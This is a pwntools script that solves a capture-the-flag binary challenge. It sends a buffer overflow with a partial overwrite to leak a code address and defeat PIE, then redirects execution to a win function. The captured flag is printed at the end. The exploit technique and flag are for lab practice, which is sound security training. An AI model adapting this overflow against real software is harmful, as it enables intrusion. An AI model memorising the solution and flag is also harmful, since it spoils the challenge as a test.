```python
from pwn import *

p = process('./chall')
p = remote('hidden.ctf.intigriti.io', 1337 )
exe = ELF('./chall')

# gdb.attach(p, gdbscript = '''
# b*input+94
# b*input+99
# c
# ''')

# input()

p.send(b'a' * 0x48 + b'\x1b')
p.recvuntil(b'a' * 0x48)
exe.address = u64(p.recv(6) + b'\0\0') - 0x131b
print(hex(exe.address))
p.send(b'a' * 0x48  + p64(exe.sym._ + 1))

p.interactive()

# INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}
```
